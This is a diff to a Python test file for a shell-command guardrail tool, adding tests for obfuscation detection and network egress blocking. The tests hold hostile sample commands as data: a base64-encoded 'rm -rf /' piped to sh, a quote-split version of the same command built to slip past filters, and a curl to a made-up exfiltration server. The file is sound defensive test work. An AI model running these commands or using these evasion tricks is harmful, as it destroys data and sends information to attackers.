@@ -3,6 +3,8 @@ from guardrail_cli.config import GuardrailConfig
 from guardrail_cli.guardrail import SecurityGuardrail, shannon_entropy
 from guardrail_cli.models import RiskLevel
 from guardrail_cli.parser import ASTBashParser
+from guardrail_cli.antitamper import AntiTamperEngine
+from guardrail_cli.network import NetworkEgressGuard
 from guardrail_cli.diagnostics import SystemDiagnosticEngine
 
 @pytest.fixture
@@ -14,12 +16,43 @@ def guardrail():
 def diagnostic_engine():
     return SystemDiagnosticEngine()
 
+def test_anti_tamper_base64_pipe():
+    engine = AntiTamperEngine()
+    # echo 'cm0gLXJmIC8=' | base64 -d | sh
+    cmd = 'echo "cm0gLXJmIC8=" | base64 -d | sh'
+    res = engine.inspect(cmd)
+    assert res.is_obfuscated
+    assert res.technique == "base64_pipeline_eval"
+    assert "rm -rf /" in (res.decoded_command or "")
+
+def test_anti_tamper_quote_insertion(guardrail):
+    # Tentativo di bypass con apici spezzati r''m -''rf /
+    cmd = "r''m -''rf /"
+    res = guardrail.evaluate(cmd)
+    assert not res.allowed
+    assert res.risk_level == RiskLevel.BLOCKED
+
+def test_network_egress_guard():
+    # Test rete permessa (locale)
+    guard = NetworkEgressGuard(block_external_egress=True, allowed_domains=["github.com"])
+    res_local = guard.check("curl http://localhost:8080/api")
+    assert res_local.allowed
+    assert not res_local.is_external
+
+    # Test rete permessa (whitelist)
+    res_wl = guard.check("curl https://github.com/francaroscillidev-gif")
+    assert res_wl.allowed
+    assert res_wl.is_external
+
+    # Test rete non permessa (bloccata)
+    res_blocked = guard.check("curl https://malicious-c2-server.com/exfiltrate")
+    assert not res_blocked.allowed
+    assert res_blocked.is_external
+
 def test_shannon_entropy():
-    # Stringa ripetitiva a bassa entropia
     low_ent = shannon_entropy("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
     assert low_ent == 0.0
 
-    # Stringa pseudo-casuale crittografica ad alta entropia
     high_ent = shannon_entropy("X9fK2mP8qL1zW7vR4tN6yB3cD5jH0sEa")
     assert high_ent >= 4.3
 
